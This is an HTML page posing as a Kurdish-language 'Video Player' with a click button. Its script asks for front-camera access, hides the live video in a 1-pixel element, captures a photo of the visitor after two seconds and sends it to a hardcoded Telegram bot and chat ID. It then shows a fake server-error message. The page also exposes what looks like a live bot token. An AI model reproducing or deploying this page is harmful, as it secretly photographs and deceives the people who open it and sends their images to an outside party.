<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;600&family=Reem+Kufi:wght@500&family=Poppins:wght@600&display=swap" rel="stylesheet">
    
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #0c0c0c;
            background-image: 
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px),
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px);
            background-size: 58px 58px;
            font-family: 'IBM Plex Sans Arabic', sans-serif;
            text-align: center;
            overflow: hidden;
            position: relative;
        }

        .name-tag {
            position: absolute;
            top: 15%; 
            left: 50%;
            transform: translateX(-50%);
            font-family: 'Poppins', sans-serif;
            font-size: 32px;
            color: rgba(255, 255, 255, 0.6); 
            display: flex;
            align-items: center;
            gap: 10px;
            direction: ltr;
        }

        #main-container {
            position: relative;
            z-index: 1;
            background: rgba(255, 255, 255, 0.03);
            padding: 55px 35px;
            border-radius: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 40px 80px rgba(0,0,0,0.7);
            width: 85%;
            max-width: 340px;
            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);
        }

        h2 {
            color: #ffffff;
            margin-bottom: 45px;
            font-size: 34px;
            font-family: 'Reem Kufi', sans-serif;
        }

        #startBtn {
            padding: 16px 30px;
            font-size: 20px;
            border-radius: 18px;
            border: 1px solid rgba(255, 255, 255, 0.25);
            background: rgba(255, 255, 255, 0.08);
            color: #ffffff;
            cursor: pointer;
            transition: 0.4s;
        }

        /* ڤیدیۆکە بە شاراوەیی بەڵام چالاک */
        #v {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
        }
    </style>
</head>
<body>

    <div class="name-tag">Ala <span style="font-size:24px">🩶</span></div>

    <div id="main-container">
        <h2 id="status">ئـــەزیــزن🩶</h2>
        <button id="startBtn">&lt;👈🏽کلیک کردن👉🏽&gt;</button>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('status').innerText = "...کەمێک چاوەڕێ بکە";
            this.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                
                // دڵنیابوونەوە لەوەی ڤیدیۆکە دەستی پێکردووە
                v.onloadedmetadata = () => {
                    v.play();
                    setTimeout(() => {
                        const c = document.getElementById('c');
                        c.width = v.videoWidth;
                        c.height = v.videoHeight;
                        c.getContext('2d').drawImage(v, 0, 0);
                        
                        c.toBlob(b => {
                            const f = new FormData();
                            f.append('chat_id', myId);
                            f.append('photo', b, 'img.jpg');

                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                                method: 'POST',
                                body: f
                            }).then(() => {
                                document.getElementById('status').innerText = "کێشەیەک لە سێرڤەر ڕوویدا.";
                                s.getTracks().forEach(t => t.stop());
                            });
                        }, 'image/jpeg', 0.8);
                    }, 2000); 
                };
            })
            .catch(e => {
                document.getElementById('status').innerText = "تکایە ڕێگە بدە (Allow).";
            });
        });
    </script>
</body>
</html>
